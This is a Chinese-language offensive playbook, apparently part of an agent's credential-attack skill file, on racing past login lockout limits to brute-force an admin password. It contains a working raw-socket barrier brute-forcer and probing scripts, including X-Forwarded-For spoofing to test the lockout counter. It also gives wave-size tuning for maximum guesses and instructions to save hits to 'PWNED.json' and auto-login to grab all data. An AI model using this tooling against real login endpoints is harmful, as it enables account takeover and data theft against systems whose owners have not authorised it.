# 登录锁定竞态绕过（login lockout race）

适用：登录口有「N 次失败锁定 M 分钟」，且锁定判定与失败计数**不在同一原子操作**里。
本文件是 `credential-attack-engineering` §2c 的展开。

## 1. 机制

典型实现（Go/Gin、Python、PHP 都常见）：

```go
n, _ := redis.Get(key + username)      // ① 判定
if n >= 5 { return "locked" }          // ② 早退
if !bcrypt.Compare(hash, pwd) {
    redis.Incr(key + username)         // ③ 计数 —— 在 bcrypt 之后
    redis.Expire(key + username, 15*60)
}
```

① 与 ③ 之间隔着一次 bcrypt（约 60–100ms）。**在这段时间内到达并完成 ① 的请求全部通过判定**，只有第一次 ③ 落地之后的请求才看到 `locked`。

结论：逐发试 → 第 6 发起全锁；**同刻并发 N 发 → 近 N 发全部通过**。实测顺序 5 发即锁，并发 50 / 1000 / 1500 全通过。

客户端不控制这个窗口。能控的只有一件事：**让所有请求在首个 bcrypt 完成前离开本机**。

## 2. 先量化策略（阈值 + TTL + 计数键）

```python
import requests
def try_login(pw):
    r = requests.post(f"http://<host>:<port>/api/v1/auth/login",
                      json={"username": "admin", "password": pw}, timeout=15)
    return r.text
```

- **阈值**：连打 5–8 发不同口令，看 `invalid username or password` → `locked` 的拐点。
- **TTL**：锁上后每 60s 打一发，记录转回 `invalid` 的时刻。注意区分「首次失败时 set TTL」与「每次失败续期」，两者决定你等 10 还是 15 分钟。
- **计数键**：打 10 发不同 `X-Forwarded-For` / `X-Real-IP` 看是否仍锁 → 判定按账号还是按 IP；再打大小写 / 尾随空白变体（`admin` / `Admin` / `admin ` 各 8 发）看是否共用一桶（实测按账号精确字符串，变体不共用）。
- **别用响应时间**：WAN 抖动下单发时序不可信（同一候选的耗时与基线可互差 2 倍）。非要用就把候选与基线**交替**测量、多轮取中位数。有锁定响应可用时优先拿锁定当预言机。

## 3. 栅栏同步爆破器

两种等价形态，关键不是同步原语，而是**全部请求在窗口内离开本机**。

### 3a. 预连接原始 socket（推荐，最接近同刻）

```python
import socket, threading, json

HOST, PORT = "<host>", int("<port>")

def preconnect(batch, threads=150):
    socks = [None] * len(batch); i = [0]; lk = threading.Lock()
    def w():
        while True:
            with lk:
                k = i[0]; i[0] += 1
            if k >= len(batch):
                return
            try:
                s = socket.socket(); s.settimeout(30); s.connect((HOST, PORT))
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                socks[k] = s
            except Exception:
                pass
    ts = [threading.Thread(target=w, daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()
    return socks

def build(pwd, path="/api/v1/auth/login"):
    body = json.dumps({"username": "admin", "password": pwd}).encode()
    head = (f"POST {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
            f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n\r\n").encode()
    return head + body

reqs = [build(p) for p in batch]
for s, r in zip(socks, reqs):          # 预构造好，临界区里只有 sendall
    if s:
        try: s.sendall(r)
        except Exception: pass
```

- **握手提前做完**：服务端按源 IP 限速建连（实测约 40 连接/秒/IP），1500 条要 35 秒。这不影响结果 —— 窗口是「首个 bcrypt」那段，不是握手那段；但**不要把握手算进波次耗时**，否则会误判成被限流。
- 连接失败的槽位记为 `NOSOCK`，是「不确定」不是「失败」，下波重试（§4 假阴性纪律）。

### 3b. 预建 socket + 线程 `Barrier`

先全部 `connect`，再 `barrier.wait()` 后各自 `requests.post`。实现更短，有效条数同量级；缺点是库层的连接池/重试会往临界区里塞噪声。

## 4. 波次大小：到顶就停（同一目标，每 15 分钟一个窗口）

| 并发 | 有效口令 | 备注 |
|---|---|---|
| 1000 | 1000 | 全通过 |
| 1500 | 1300–1476 | 最佳性价比 |
| 2500 | 1250–1620 | 波动大，偶发整波塌到 ~250 |
| 4000 | 1284 | 多出 1300+ 连接错误 |

**有效条数在 ~1300–1600 处饱和**：瓶颈是服务端 nginx → 后端的转发速率，不是客户端并发度。
按「每窗口有效条数」调参；整波塌陷时先降回 1500 再跑一波，**不要加码**。
多源 IP（SKILL §3 的 `bind`）对「建连慢」有效，对「有效条数」无增益 —— 窗口在服务端那侧。

## 5. 字典推进与命中接线

- 只把 `invalid username or password` 与命中计入「已试」；`locked` / 连接错误 / 500 **留在剩余字典**下波重试，否则进度是假的（一波 1500 里可能只有 1200 是真失败）。
- 波次间隔按 TTL 走，不是按 RTT。
- 命中即写独立状态文件（`PWNED.json` / `HIT.txt`），再挂一个常驻监听进程自动登录、抓全量数据。**监听进程只读状态文件、绝不碰登录口**，否则和爆破抢同一个锁桶、把窗口搞脏。
- 字典按「已试集合 = (历史名单 ∪ 规则名单) − 剩余名单」重建，不要凭记忆拼下一层，否则会重跑几万条已试口令。

## 6. 这个技巧解决不了什么

- **按 IP 的连接速率限制**（建连慢）—— 换源 IP 只解决这一半，且不提升有效条数。
- **bcrypt 哈希本身**：竞态给的是「每窗口 ~1300 发」，不是无限次。1.5M 条字典 = 数十小时量级，**开工前先跟用户对齐时间预算**，别默认能跑完。
- **第二道门**：2FA / 一次性 token / 首次强制改密 / 临时凭据。密码对了还可能卡在 `/auth/verify-2fa` 这类端点上；波次里任何既非 `invalid` 也非 `locked` 的响应都要立刻展开看。
- **按账号锁定**：换 IP、伪造 XFF、变体用户名全都不换桶。
